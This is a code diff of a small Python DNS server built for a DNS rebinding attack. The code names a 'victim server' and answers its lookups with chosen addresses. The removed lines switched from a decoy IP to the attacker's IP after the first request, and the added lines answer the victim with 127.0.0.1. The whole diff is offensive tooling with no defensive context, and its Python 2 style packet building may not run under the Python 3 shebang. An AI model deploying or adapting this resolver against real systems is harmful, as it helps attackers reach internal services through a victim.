@@ -1,5 +1,8 @@
+#!env python3
 import socket
 from time import time
+import datetime
+
 
 class DNSQuery:
 	def __init__(self, data):
@@ -28,30 +31,44 @@ class DNSQuery:
 			packet += ''.join(chr(int(x)) for x in ip.split('.'))
 		return packet
 
+
+'''
+Prints positive message (in green)
+'''
+def message_positiv(message):
+    print('\033[92m' +"[+] " + message + '\033[0m')
+
+
+'''
+Prints info message
+'''
+def message_info(message):
+    print("[*] " + message)
+
+
 if __name__ == '__main__':
 	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	udp.bind(('',54))
-
+	dnsPort = 53
+	udp.bind(('',dnsPort))
+	message_info("Binding DNS server on Port: " + str(dnsPort))
+	
 	firstRequest = True # Track if first request
-	ip = "127.0.0.1" # Default IP
+	ip = "192.168.10.0" # Default IP
 	try:
 		while 1:
 			data, addr = udp.recvfrom(1024)
-			print "Got request from: ", addr[0]
 			p = DNSQuery(data)
-
 			# only IN A questions are supported
 			if p.domain and p.qtype == 1:
 				if addr[0] == "127.0.0.1": # if request from victim IP
-					print "Got request from victim"
-					
-					if firstRequest: # First request, send fake IP the victim expects/wants
-						ip = "10.10.10.10"
-						firstRequest = False
-					else: # if its the second request send our IP
-						ip = "11.11.11.11"
-					print '%s -> %s' % (p.domain, ip)
+					message_positiv(str(datetime.datetime.now()) + " ->  Got request from victim server. IP: " + str(addr[0]))				
+					ip = "127.0.0.1"
+				else:
+					message_info("Got request from IP: " + str(addr[0]))
+				
+				message_info("	" + p.domain + " -> " + str(ip))
 				udp.sendto(p.reply(ip), addr)
 
 	except KeyboardInterrupt:
 		udp.close()
+
